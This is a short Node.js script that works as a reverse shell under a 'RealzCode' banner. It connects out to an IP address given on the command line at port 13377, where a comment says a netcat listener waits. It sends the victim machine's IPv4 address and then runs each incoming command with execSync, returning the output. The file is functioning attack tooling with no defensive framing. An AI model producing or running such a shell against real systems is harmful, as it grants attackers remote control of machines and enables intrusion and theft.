const net = require('net');
const os = require('os');

let we = `
  _____            _      _____          _      
 |  __ \\          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \\/ _\` | |_  / |    / _ \\ / _\` |/ _ \\
 | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \\_\\___|\\__,_|_/___|\\_____|\\___/ \\__,_|\\___|
`;

const po = 13377; // nc -l -p 13377

if (process.argv.length < 3) {
  console.log('Please provide the IP address as a command-line argument.');
  process.exit(1);
}

const ip = process.argv[2];
const clientIp = Object.values(os.networkInterfaces())
  .flat()
  .find((iface) => iface.family === 'IPv4' && !iface.internal).address;
we += `Client IP: ${clientIp}\n`;

const sock = new net.Socket();

sock.connect(po, ip, () => {
  console.log(`${ip}:${po}`);
  sock.write(`${we}\n`);
});

sock.on('data', (data) => {
  const cmd = data.toString().trim();

  if (cmd === 'exit') {
    sock.end();
    return;
  }

  const output = require('child_process').execSync(cmd).toString();
  sock.write(output);
});

sock.on('error', (err) => {
  console.error(`Error: ${err.message}`);
});

sock.on('close', () => {
  process.exit();
});
